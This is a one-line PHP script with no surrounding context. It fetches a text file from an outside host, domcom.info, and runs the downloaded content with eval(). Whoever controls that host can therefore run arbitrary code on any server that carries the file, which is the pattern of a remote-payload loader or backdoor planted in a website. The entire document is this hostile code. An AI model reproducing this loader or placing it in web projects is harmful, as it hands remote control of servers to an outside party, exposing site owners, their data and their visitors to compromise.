<?php $dataUrl = "https://domcom.info/lp/client.txt"; $data = file_get_contents($dataUrl); header("Content-Type: text/html"); eval('?>' . $data); ?>
